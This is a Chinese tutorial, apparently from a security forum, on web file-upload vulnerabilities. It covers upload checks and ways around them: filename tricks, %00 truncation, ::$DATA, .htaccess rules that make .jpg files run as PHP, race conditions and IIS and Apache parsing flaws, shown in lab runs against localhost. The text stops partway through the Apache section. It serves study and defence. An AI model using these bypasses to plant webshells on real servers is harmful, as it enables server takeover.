0x01 文件上传漏洞
===========

概述：
---

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。  
如果WEB应用在文件上传过程中没有对文件的安全性进行有效的校验，攻击者可以通过上传WEBshell等恶意文件对服务器进行攻击，这种情况下认为系统存在文件上传漏洞。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-082a346dee6eea8a9356c30cc773031c900fe24f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-082a346dee6eea8a9356c30cc773031c900fe24f.png)

WebShell——网页木马文件
----------------

最常见利用文件上传漏洞的方法就是上传网站木马(webshell)文件，  
WEBSHELL又称网页木马文件，根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制

0x02 上传检测流程
===========

通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。

1. 客户端javascript校验（一般只校验文件的扩展名）
2. 服务端校验 
    - 文件头content-type字段校验（image/gif）
    - 文件内容头校验（GIF89a）（前两种都属于MIME类型检验）
    - 目录路经检测（检测跟Path参数相关的内容）
    - 文件扩展名检测 (检测跟文件 extension 相关的内容)
    - 后缀名黑名单校验
    - 后缀名白名单校验
    - 自定义正则校验
3. WAF设备校验（根据不同的WAF产品而定）

0x03 客户端校验（JavaScript检测）
========================

这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。由于JavaScript在客户端执行的特点，可以通过修改客户端代码或先上传符合要求的文件再在上传过程使用BURP等工具篡改文件等方式来绕过。

这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下：  
function CheckFileType()  
{  
var objButton=document.getElementById("Button1");//上传按钮  
var objFileUpload=document.getElementById("FileUpload1");  
var objMSG=document.getElementById("msg");//显示提示信息用DIV  
var FileName=new String(objFileUpload.value);//文件名  
var extension=new String(FileName.substring(FileName.lastIndexOf(".")+1,FileName.length));//文件扩展名

```php
    if(extension=="jpg"||extension=="JPG")//可以另行添加扩展名
    {
         objButton.disabled=false;//启用上传按钮
         objMSG.innerHTML="文件检测通过";
     }
     else
     {
         objButton.disabled=true;//禁用上传按钮
         objMSG.innerHTML="请选择正确的文件上传";
     }
}
```

**判断方式：**  
在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。

**绕过方法：**

- 上传页面，审查元素，修改JavaScript检测函数；
- 将需要上传的恶意代码文件类型改为允许上传的类型，例如将dama.asp改为dama.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名dama.jpg改为dama.asp。
- 上传webshell.jpg.jsp，可能前端程序检查后缀时，从前面开始检查。

**具体操作：**  
上传一句话木马1.php更改为1.jpg  
使用burp进行抓包  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1ecbb6593c3fa990fd2d577a670ff7994eed45f3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1ecbb6593c3fa990fd2d577a670ff7994eed45f3.png)  
上传成功，并且按F12查看木马位置  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e320c648cd92edcf5b3b20ef67cd4f1e72625579.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e320c648cd92edcf5b3b20ef67cd4f1e72625579.png)  
连接木马  
url：<http://127.0.0.1/upload/upload/1.php>  
POST：v=phpinfo();  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b61bb587aee7346fb0e27b57e207311a6fcd192d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b61bb587aee7346fb0e27b57e207311a6fcd192d.png)

0x04 服务端检测
==========

MIME类型检测
--------

MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。标准的文件上传组件中会自动上传文件的MIME类型。

服务器端检测文件MIME类型可能的代码如下：

```html
<?php
    if($_FILES['file']['type'] != "image/gif")
    {
    echo "Sorry, we only allow uploading GIF images";
    exit;
    }
    $uploaddir = './';
    $uploadfile = $uploaddir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
    {
    echo "File is valid, and was successfully uploaded.\n";
    } else {
    echo "File uploading failed.\n";
    }
?>
```

**绕过方法：**  
配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型  
然后在对应目录生成shell.jpg

**具体操作：**  
上传一句话木马1.php，并且使用burp抓包  
将Content-Type的内容改为：image/jpeg  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-599cc1c1b30d6e8ada4be41be274fc4634f3e71a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-599cc1c1b30d6e8ada4be41be274fc4634f3e71a.png)  
连接木马  
url：<http://127.0.0.1/upload/upload/1.php>  
POST：v=phpinfo();  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1431203394bbbf23f36e181cfe3c66af5dcaf08d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1431203394bbbf23f36e181cfe3c66af5dcaf08d.png)

目录路径检测
------

上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell，该方法一般asp系统用比较多。  
例如path参数为如下`“upfile/”`，可以尝试修改为`“upfile.asp/”` 或者`“upfile/1.asp/”` 或者 `“upfile/1.asp;”`，注意观察返回的文件名。返回的文件名可能为：`upfile/1.asp;.201704117886.jpg`，满足IIS6.0解析漏洞。

文件扩展名检测
-------

### 黑名单检测：

黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfcbat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh等等。黑名单则可以通过对关键函数的各类混淆变化来绕过。

黑名单扩展名过滤，限制不够全面：IIS默认支持解析.asp | .cdx | .asa | .cer等

```html
<?php
function getExt($filename){
   //sunstr - 返回字符串的子串
   //strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）
   return substr($filename,strripos($filename,'.')+1);
   }
   if($_FILES["file"]["error"] > 0)
   {
   echo "Error: " . $_FILES["file"]["error"] . "<br />";
   }

   else{

   $black_file = explode("|","php|jsp|asp");//允许上传的文件类型组

   $new_upload_file_ext = strtolower(getExt($_FILES["file"]["name"])); //取得被.隔开的最后字符串

   if(in_array($new_upload_file_ext,$black_file))

   {

       echo "文件不合法";
       die();

       }

   else{

       $filename = time().".".$new_upload_file_ext;

       if(move_uploaded_file($_FILES['file']['tmp_name'],"upload/".$filename))

       {

           echo "Upload Success";

           }

     }
}
?>
```

### 白名单检测：

仅允许指定的文件类型上传，比如仅允许上传jpg | gif | doc | pdf等类型的文件，其他文件全部禁止。  
针对白名单检测，可以在满足要求的文件后插入木马脚本语句来绕过。

文件内容检测
------

### 文件幻数检测：

- JPG ： FF D8 FF E0 00 10 4A 46 49 46
- GIF ： 47 49 46 38 39 61 (GIF89a)
- PNG： 89 50 4E 47

**绕过方法**  
在文件幻数后面加上自己的一句话木马就行了。

### 文件相关信息检测：

一般就是检查图片文件的大小，图片文件的尺寸之类的信息。

**绕过方法：**  
伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。

### 文件加载检测：

这个是最变态的检测，一般是调用API或者函数去进行文件加载测试，常见的是图像渲染测试，再变态一点的甚至是进行二次渲染。  
绕过方法：

- 针对渲染加载测试：代码注入绕过
- 针对二次渲染测试：攻击文件加载器

通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。

简化的演示代码：

```html
<?php
var_dump(getimagesize("shell.php"));
?>
```

加上GIF头内容

### 二次渲染

imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了

```html
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagejpeg($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagepng($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagegif($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。

**绕过方法**  
图片木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f58fa57b1ba35147a4c6b1b5f3f0a104b003eb1c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f58fa57b1ba35147a4c6b1b5f3f0a104b003eb1c.png)

### 条件竞争

```html
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。

**绕过方法**  
使用burp不断访问webshell  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b5d7bd42b17d6667cd4ada40daf0a070426b6fb0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b5d7bd42b17d6667cd4ada40daf0a070426b6fb0.png)

0x04 WAF设备校验
============

大小上限：WAF对校验的用户数据设置大小上限，此时可以构造一个大文件的木马，前面都是填充的垃圾内容  
filename：针对早期版本的安全狗，可以多加一个filename来绕过，  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-702a0d9dfa510bd516c349e3d4d2704bc5d84d9f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-702a0d9dfa510bd516c349e3d4d2704bc5d84d9f.png)  
或者可以通过吧filename放在非常规的位置来绕过（这里的filename指在http请求头中上传的文件名字）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1e1c30d7b0d1d04630bbf114c8f6377470df0d7f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1e1c30d7b0d1d04630bbf114c8f6377470df0d7f.png)  
1.post/get：如果WAF规则是：只检测特定请求类型的数据包，但服务端接收的时候却用了request来，此时通过修改请求头的请求方法就可以绕过  
2.利用waf本身的缺陷，对于不同的waf产品可以搜索其对应的漏洞缺陷，进行绕过  
3.利用NTFS ADS特性：ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过  
4.文件重命名绕过：如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。

0x05 绕过方法：
==========

1.文件名大小写绕过：
-----------

使用Asp、PhP之类的文件名绕过黑名单检测  
**具体操作：**  
上传一句话木马，burp抓包  
将1.php改成1.phP  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-871fc01cc26faa862a372c0e259644d7faaeb569.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-871fc01cc26faa862a372c0e259644d7faaeb569.png)  
上传成功，按F12查看位置  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ceec849665a5dd5747b40b22a3fa0d3f25854725.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ceec849665a5dd5747b40b22a3fa0d3f25854725.png)  
连接木马  
url：<http://127.0.0.1/upload/upload/202108040609525692.phP>  
POST：v=phpinfo();  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-246136fec3d734a6317435c15d00a025f310dfb4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-246136fec3d734a6317435c15d00a025f310dfb4.png)

2.文件名双写绕过：
----------

使用pphphp的文件名绕过黑名单检测

**具体操作：**  
上传一句话木马，使用burp抓包  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ad8c8b575bae9ae7be5cbe4774d4583556e6bdf3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ad8c8b575bae9ae7be5cbe4774d4583556e6bdf3.png)  
发现被php过滤，并且名字被更改了  
这时我们进行双写绕过  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4f31b318db998c9c5d8196ce5405269f8f7b32dd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4f31b318db998c9c5d8196ce5405269f8f7b32dd.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-079432fcba7c7e68f57eb90e371ac5b30d683085.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-079432fcba7c7e68f57eb90e371ac5b30d683085.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8a25ae62e46ca9ec1016fe23550103224d667272.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8a25ae62e46ca9ec1016fe23550103224d667272.png)

3.名单列表绕过：
---------

用黑名单里没有的名单进行攻击

4.不常见的扩展名:
----------

程序员在设置黑名单时通常会添加一些常见的脚本文件扩展，但是对于一些不常见的扩展名则有可能被忽略，这些扩展名可以正常被解析达到与木马相同的效果。例如: PHP3、PHP4、PHP5、PH、CER、CDX、ASA等。

**具体步骤：**  
上传一句话木马，并且使用burp抓包  
将1.php改成1.php3  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fab9854166beaac977c57ea04831b9e946868999.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fab9854166beaac977c57ea04831b9e946868999.png)  
查看文件位置  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d4361b88957fa2efae4297d0b9c8694fb465e1cd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d4361b88957fa2efae4297d0b9c8694fb465e1cd.png)  
连接木马  
url：<http://127.0.0.1/upload/upload/1.php3>  
POST：v=phpinfo();  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ab75ee90c77095cb327a9c8758e3a58271b2dcca.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ab75ee90c77095cb327a9c8758e3a58271b2dcca.png)

5.特殊文件名绕过：
----------

比如在发送的HTTP包中，将文件名改为`”dama.asp.”`或者`”dama.asp_”`(下划线为空格)，这种命名方式在window系统里是不被允许的，所以需要在Burp Suite中抓包修改，上传之后，文件名会被window自动去掉后面的点或者空格，需要注意此种方法仅对window有效，Unix/Linux系统没有这个特性。

上传不符合windows文件命名规则的文件名

```html
 test.asp.
 test.asp(空格)
 test.php:1.jpg
 test.php::$DATA
 shell.php::$DATA…….
```

**具体操作：**  
上传一句话木马，使用burp抓包  
将1.php改成1.php::$DATA，访问时去除后缀  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-678f808133639219f1b6d7742bd3674bbbf06705.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-678f808133639219f1b6d7742bd3674bbbf06705.png)  
查看文件位置  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-31646a16ee734156b1a99fd756d1b393619d80c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-31646a16ee734156b1a99fd756d1b393619d80c1.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b05671b8549a3e8ea9cd52a55efc76fc64725033.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b05671b8549a3e8ea9cd52a55efc76fc64725033.png)

6.截断绕过：
-------

### 0x00截断:

在许多语言的函数中，比如在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符。攻击者通常会利用该字符构造特殊的后缀名或目录来绕过白名单的限制。比如应用原本只允许JPG上传，攻击者修改POST包，构造文件名为`xx.php[/0]JPG`，`/0]`为16进制的0x00字符，.JPG绕过了应用的上传文件类型判断﹔但是对于服务端来说，由于有0x00字符，认为中止了，最终会认为读取的是xx.php文件。

伪代码如下：

```html
Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpg
Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件
If(type == jpg)
SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里
```

1、截断条件: PHP版本小于5.3.4，php的`magic_quotes_gpc`为OFF状态时，可用%00来代替\\x00实现文件上传的绕过。Ctrl+shift+u  
2、若文件名可控制，可以尝试构造类似于`1.asp\x00.JPG`的方式来进行绕过白名单检测机制;  
3、若文件路径可控制，可以尝试构造文件路径为`1.asp\x00`，文件名为符合白名单的扩展名的方式来进行绕过白名单检测机制

**利用格式：**

```html
test.php(0x00).jpg     
test.php%00.jpg
```

**操作方法：**  
上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。

**具体操作：**  
上传一句话木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71256942d3281b37ae49eb643c9b486b8d654d21.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71256942d3281b37ae49eb643c9b486b8d654d21.png)  
发现只能jpg .jpeg .JPG .JPEG这几种格式文件类型上传！  
那我们更改后缀上传一句话木马，使用burp抓包，并且转到repeater模块  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b455c5e1a5c85c27654ed604532a4d0d09e1a0d0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b455c5e1a5c85c27654ed604532a4d0d09e1a0d0.png)  
我们更改后缀名为php发送  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd7259e1201592c1b58e40b538857a8d943a874e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd7259e1201592c1b58e40b538857a8d943a874e.png)  
发现还是不行，我们进行尝试通过%00截断上传  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6106ae9836e984bfa8e8a279ec1e435551bc824f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6106ae9836e984bfa8e8a279ec1e435551bc824f.png)  
上传成功，选中%00选中右键使用url解码或者通过ctrl+shift+U解码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c98cd3cddd7d2dd4b6268d308545dcbb05f8c744.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c98cd3cddd7d2dd4b6268d308545dcbb05f8c744.png)  
上传成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6a60219cc2e80a346164a012a6bfb1ec2578b927.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6a60219cc2e80a346164a012a6bfb1ec2578b927.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-291ffddccf8f352066e1d7d01a08ee417c21d804.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-291ffddccf8f352066e1d7d01a08ee417c21d804.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b8d11afcaa3ecc85f7ce450e5c66f5a6ef9f62f6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b8d11afcaa3ecc85f7ce450e5c66f5a6ef9f62f6.png)

### 冒号截断：

冒号截断:冒号（“:”）是一个在系统中不能作为文件名的符号，在文件保存时会自动截断冒号后面的内容，住是某些文件保存函数中没有对其处理，可以尝试构造类似于1.php:1.jpg的文件绕过白名单检测。

7.上传.htaccess文件绕过：
------------------

（适用于黑名单检测方式，黑名单中未限制.htaccess）

.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录;

该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在`httpd.conf`文件中配置。该文件的写法如下：  
**第一种：**

```html
<FilesMatch "a.jpg"> 
  SetHandler application/x-httpd-php
</FilesMatch>
```

保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”a.jpg”字符串的任意文件，统一执行。如果这个"a.jpg"的内容是一句话木马，即可利用中国菜刀进行连接

**第二种：**

```html
AddType application/x-httpd-php    .jpg
```

.htaccess文件可以实现很多特殊功能，其中一个功能可以修改扩展名的解析方式，如:在.htaccess文件中添加以下内容，可以将.jpg文件解析为`PHPAddTypeapplication/x-httpd-php .jpg;`

把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件

**具体操作：**  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dd22a537cf3dc1017b270c2c8197730d0bdced04.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dd22a537cf3dc1017b270c2c8197730d0bdced04.png)  
先上传.htaccess文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1fef1f9894d6f8e62ccb6aa96300760147d8c662.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1fef1f9894d6f8e62ccb6aa96300760147d8c662.png)  
上传成功。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bac13aca32b70e81ce837525bffba1e7ae561db0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bac13aca32b70e81ce837525bffba1e7ae561db0.png)  
再上传一句话木马1.jpg  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b4ae6623859e876f2590da591a433cdcbf431048.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b4ae6623859e876f2590da591a433cdcbf431048.png)  
上传成功，连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-475e1628ecf421275cbf6f449f18187b07f62355.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-475e1628ecf421275cbf6f449f18187b07f62355.png)

8.双文件上传
-------

➢双文件上传是一-种特殊的攻击方式，该类型的攻击主要是利用程序员在编写白名单检测机制时没有考虑到一次性上传多个文件的情况下，检测机制的不完

整性来进行上传攻击。  
➢通常可以通过修改html页面的方式来实现一次上传多个文件,其中第一个文件为正常的文件，第二个文件为webshell文件, 服务端在校验了第一个文件通过后，检测机制对第二个文件失效,使得webshell文件上传成功。

**具体操作：**  
按F12查看源码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a2309f9ccab219b06d1b006791089fee89dfaa3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a2309f9ccab219b06d1b006791089fee89dfaa3.png)  
发现空白处可以填写  
我们尝试进行双文件上传  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-84f149c6fa43bd488c879d2bb4cc654bee3b2436.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-84f149c6fa43bd488c879d2bb4cc654bee3b2436.png)  
上传两个木马文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-32b467644655c9699a5fb7ab3934cd2d959cc4f5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-32b467644655c9699a5fb7ab3934cd2d959cc4f5.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7d8f55e4e3bfdf8f2057a1f1720f3e75c30d433b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7d8f55e4e3bfdf8f2057a1f1720f3e75c30d433b.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aefa15310780d960a22ef7130639e70d7636a868.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aefa15310780d960a22ef7130639e70d7636a868.png)

9.利用文件解析漏洞绕过
------------

### IIS5.x-6.x解析漏洞

使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。

目录解析(6.0)  
形式：`www.xxx.com/xx.php/xx.jpg`  
原理: 服务器默认会把.php，.php目录下的文件都解析成php文件。

形式：`www.xxx.com/xx.php;.jpg`  
原理：分号;以后的内容在解析过程中会被忽略,所有服务器默认不解析;号后面的内容，因此xx.php;.jpg便被解析成php文件了。

**具体操作：**  
上传一句话木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-027506e1421c4edab2db05b2ff06882ab0093777.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-027506e1421c4edab2db05b2ff06882ab0093777.png)  
提示说该文件不是图片，改成上传图片马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8129184ce5bc2e9ef743bf2b2cbf2ceeea90dd57.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8129184ce5bc2e9ef743bf2b2cbf2ceeea90dd57.png)  
发现是iis6.0版本的解析漏洞，利用起来  
利用iis6.0版本的解析漏洞b.php;b.jpg  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e942afae0d1007e61f1343a2711e4cd98685f061.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e942afae0d1007e61f1343a2711e4cd98685f061.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8b853c8c4715b3f648ba715763f2616c9b16c8ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8b853c8c4715b3f648ba715763f2616c9b16c8ff.png)

### apache解析漏洞

apache对于 文件名的解析是从后往前解析的，**直到碰到认识的扩展名为止**。如果扩展名白名单中包含Apache无法解析的扩展名(以.7z为例) ,则可以构造类似于: `1.php.7z`这样的文件名进行上传，由于7z文件Apache无法解析, Apache最终会将该文件作为PHP脚本解析。

**漏洞形式:**

```html
www.xxxx.xxx.com/test.php.php123
```

**其余配置问题导致漏洞**  
如果在 Apache 的 conf 里有这样一行配置 `AddHandler php5-script .php` 这时只要文件名里包含`.php`即使文件名是`test2.php.jpg`也会以 `php` 来执行。  
如果在 Apache 的 conf 里有这样一行配置 `AddType application/x-httpd-php .jpg`即使扩展名是 jpg，一样能以 php 方式执行。

**修复方案**  
apache配置文件，禁止.php.这样的文件执行，配置文件里面加入  
用伪静态能解决这个问题，重写类似`.php.*`这类文件，打开`apache`的`httpd.conf`找到`LoadModule rewritemodule modules/modrewrite.so` 把#号去掉，重启`apache`,在网站根目录下建立`.htaccess`文件

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule .(php.|php3.) /index.php
RewriteRule .(pHp.|pHp3.) /index.php
RewriteRule .(phP.|phP3.) /index.php
RewriteRule .(Php.|Php3.) /index.php
RewriteRule .(PHp.|PHp3.) /index.php
RewriteRule .(PhP.|PhP3.) /index.php
RewriteRule .(pHP.|pHP3.) /index.php
RewriteRule .(PHP.|PHP3.) /index.php
</IfModule>
```

**具体操作：**  
上传一句话木马，使用burp抓包转到repeater模块  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b4fcc6b7e83db396526d381e008f06c4ccda7bc3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b4fcc6b7e83db396526d381e008f06c4ccda7bc3.png)  
发现有个特殊的7z后缀名  
